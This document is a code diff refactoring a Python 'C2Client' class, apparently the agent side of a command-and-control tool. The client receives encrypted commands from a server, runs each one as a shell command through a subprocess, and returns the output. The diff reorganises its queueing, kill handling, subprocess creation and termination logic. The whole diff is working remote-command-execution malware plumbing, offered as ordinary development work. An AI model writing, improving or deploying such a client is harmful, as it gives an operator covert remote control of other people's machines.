@@ -71,7 +71,6 @@ class C2Client:
         self.writer = None
         self.running = True
         self.command_queue = asyncio.Queue()
-        self.shutdown_event = asyncio.Event()
         self.execution_process = None
     
     async def connect(self) -> bool:
@@ -149,6 +148,7 @@ class C2Client:
             
         except asyncio.CancelledError:
             logger.info("Reconnect loop cancelled")
+            await self._reset_writer_reader()
         except Exception as e:
             logger.error(f"Reconnect loop error: {e}")
             await self._reset_writer_reader()
@@ -157,29 +157,30 @@ class C2Client:
         """
         Main client loop
         """
-        self.shutdown_event.clear()
         tasks = [
             asyncio.create_task(self._command_listener()),
             asyncio.create_task(self._command_processor()),
         ]
-        tasks.append(
-            asyncio.create_task(self._monitor(tasks))
-        )
-        
+
         try:
             await asyncio.gather(*tasks)
         except asyncio.CancelledError:
             logger.info("Client main loop cancelled")
             self.running = False
+        except Exception as e:
+            logger.error(f"Client main loop error: {e}")
         finally:
             logger.info("Client canceling tasks")
             await self._cancel_tasks(tasks)
+            logger.info("Terminating execution process")
+            await self._terminate_execution_process()
             # Clear connection state
             await self._reset_writer_reader()
             logger.info('Main loop done')
 
     async def _reset_writer_reader(self):
         try:
+            logger.info('in reset_writer_reader')
             if self.writer and not self.writer.is_closing():
                 self.writer.close()
                 await self.writer.wait_closed()
@@ -188,25 +189,6 @@ class C2Client:
         finally:
             self.reader = None
             self.writer = None
-
-    async def _monitor(self, tasks: List[asyncio.Task]):
-        """
-        Monitor connection health
-        """
-        try:
-            await self.shutdown_event.wait()
-            if not self.running:
-                logger.info("Monitor caught termination event triggered")
-            else:
-                logger.info("Monitor caught reconnection event triggered")
-            
-        except asyncio.CancelledError:
-            logger.info("Monitor cancelled")
-        except Exception as e:
-            logger.error(f"Monitor error: {e}")
-        finally:
-            await self._cancel_tasks(tasks)
-            await self._terminate_execution_process()
 
     @staticmethod
     async def _cancel_tasks(tasks: List[asyncio.Task]):
@@ -239,25 +221,28 @@ class C2Client:
                     logger.warning(f"Failed to decrypt message")
                     break
                 
-                if msg.type is MessageType.COMMAND:
-                    if msg.command == CommandType.KILL.value:
-                        logger.info("[_command_listener] Received kill command")
-                        await self._terminate_execution_process()
-                        self._drain_queue()
-                    # Queue command for execution
-                    await self.command_queue.put({
-                        "cmd_id": msg.cmd_id,
-                        "command": msg.command
-                    })
-                    logger.info(f"Received command: {msg.command}")
-                else:
+                if msg.type is not MessageType.COMMAND:
                     logger.warning(f"Unknown message type: {msg.type}")
+                    continue
+
+                if msg.command == CommandType.KILL.value:  # TODO
+                    logger.info("[_command_listener] Received kill command")
+                    await self._terminate_execution_process()
+                    self._drain_queue()
+                    self.running = False
+                # Queue command for execution
+                await self.command_queue.put({
+                    "cmd_id": msg.cmd_id,
+                    "command": msg.command
+                })
+                logger.info(f"Received command: {msg.command}")
+            else:
+                logger.info("command_listener exiting | client not running")
         
         except asyncio.CancelledError:
             logger.info('command_listener cancelled')
         except asyncio.IncompleteReadError:
             logger.info(("Server" if self.running else "Client") + " closed connection")
-            self.shutdown_event.set()
         except Exception as e:
             logger.error(f"Command listener error: {e}")
 
@@ -271,6 +256,17 @@ class C2Client:
             logger.info("Drained command queue")
         except asyncio.QueueEmpty:
             logger.info("Command queue is empty")
+
+    async def _fetch_command_from_queue(self) -> tuple[str, str]:
+        """
+        Fetch command from queue
+        """
+        command_data: dict = await self.command_queue.get()
+        if command_data is None:
+            return None, None
+        command_id: str = command_data.get("cmd_id")
+        command: str = command_data.get("command", "").lower()
+        return command_id, command
     
     async def _command_processor(self):
         """
@@ -278,50 +274,33 @@ class C2Client:
         """
         try:
             while self.running:
-                cmd_data = await self.command_queue.get()
-                cmd_id = cmd_data.get("cmd_id")
-                command = cmd_data.get("command", "").lower()
+                cmd_id, command = await self._fetch_command_from_queue()
+                if command is None:
+                    logger.info("Received None from queue")
+                    continue
                 
-                if not self._encryption_manager:
-                    logger.error("Encryption not established")
-                    break
-                
-                logger.info(f"Executing: {command}")
-                start_time = time.monotonic()
-                result = await self._process_command(command)
-                exec_time_ms = (time.monotonic() - start_time) * 1000
-                
+                result, exec_time_ms = await self._process_command(command)
                 # Send result back to server
-                if await self._send_result(cmd_id, result, exec_time_ms):
-                    logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
-                else:
-                    logger.debug("Failed to send result - connection lost")
+                if not await self._send_result(cmd_id, result, exec_time_ms):
+                    logger.info("Failed to send result - connection lost")
                     break
-
-                # Exit after sending kill result
-                if not self.running:
-                    return
+                logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
+            else:
+                logger.info("command_processor exiting | client not running")
             
         except asyncio.CancelledError:
             logger.info('command_processor cancelled')
         except Exception as e:
             logger.error(f"Command processor error: {e}")
 
-    async def _process_command(self, command: str) -> str:
-        if command == CommandType.KILL.value:
-            result = self._process_kill_command()
+    async def _process_command(self, command: str) -> tuple[str, float]:
+        start_time = time.monotonic()
+        if command == CommandType.KILL.value:  # TODO
+            result = "Client killed by server"
         else:
             result = await self._execute_command(command)  # Run asynchronously with subprocess
-        return result
-    
-    def _process_kill_command(self) -> str:
-        """Process kill command"""
-        logger.info("Processing kill command")
-        self.running = False
-        # Close reader to stop listener from reading
-        if self.reader:
-            self.reader.feed_eof()
-        return "Client killed by server"
+        exec_time_ms = (time.monotonic() - start_time) * 1000
+        return result, exec_time_ms
     
     async def _send_result(self, command_id: str, result: str, execution_time_ms: str) -> bool:
         msg = Message.as_result(command_id, result, execution_time_ms)
@@ -347,37 +326,46 @@ class C2Client:
         Supports pipes, redirects, etc.
         """
         try:
-            if is_windows():
-                kwargs = {"creationflags": subprocess.CREATE_NEW_PROCESS_GROUP}
-            else:
-                kwargs = {"start_new_session": True}
-
-            self.execution_process = await asyncio.create_subprocess_shell(
-                command,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-                **kwargs
-            )
-            
-            # Combine stdout and stderr
-            stdout, stderr = await self.execution_process.communicate()
+            self.execution_process = await self._create_subprocess(command)
+            logger.info(f"Execution process created (pid: {self.execution_process.pid})")
+            output = await self._communicate_subprocess(self.execution_process)
             self.execution_process = None
-            output = stdout.decode() + (f"\n[stderr] {stderr.decode()}" if stderr else "")
-            return output if output else "[No output]"
+            return output
         except asyncio.CancelledError:
+            logger.info("Command execution cancelled - terminating process")
             await self._terminate_execution_process()
             raise            
-        except subprocess.TimeoutExpired:
-            return "[Command timed out after 30s]"
         except Exception as e:
-            return f"[Error: {str(e)}]"
+            logger.info(f"Command execution error: {str(e)}")
+            raise
+        
+    @staticmethod
+    async def _create_subprocess(command: str) -> asyncio.subprocess.Process:
+        if is_windows():  # TODO
+            kwargs = {"creationflags": subprocess.CREATE_NEW_PROCESS_GROUP}
+        else:
+            kwargs = {"start_new_session": True}
+
+        execution_process = await asyncio.create_subprocess_shell(
+            command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+            **kwargs
+        )
+        return execution_process
+
+    @staticmethod
+    async def _communicate_subprocess(subprocess: asyncio.subprocess.Process) -> str:
+        stdout, stderr = await subprocess.communicate()
+        output = stdout.decode() + (f"\n[stderr] {stderr.decode()}" if stderr else "")
+        return output if output else "[No output]"
 
     async def _terminate_execution_process(self):
         """Terminate execution process if it exists"""
         if not self.execution_process:
             return
         try:
-            logger.info(f"Terminating execution process {self.execution_process.pid}")
+            logger.info(f"Terminating execution process (pid: {self.execution_process.pid})")
             await self._terminate_subprocess_gracefully(self.execution_process)
             self.execution_process = None
         except asyncio.TimeoutError:
@@ -392,14 +380,21 @@ class C2Client:
     @staticmethod
     async def _terminate_subprocess_gracefully(process: subprocess):
         """Terminate a subprocess gracefully"""
-        if is_windows():
-            process.send_signal(signal.CTRL_BREAK_EVENT)
-        else:
-            os.killpg(process.pid, signal.SIGTERM)
-        await asyncio.wait_for(
-            process.wait(),
-            timeout=SUBPROCESS_TERMINATION_GRACE_TIME_S
-        )
+        try:
+            if is_windows():
+                process.send_signal(signal.CTRL_BREAK_EVENT)
+            else:
+                os.killpg(process.pid, signal.SIGTERM)
+            await asyncio.wait_for(
+                process.wait(),
+                timeout=SUBPROCESS_TERMINATION_GRACE_TIME_S
+            )
+        except asyncio.TimeoutError:
+            logger.error("Graceful termination timed out")
+            raise
+        except Exception as e:
+            logger.error(f"Error gracefully terminating process: {e}")
+            raise
 
     @staticmethod
     async def _terminate_subprocess_forcefully(process: subprocess):
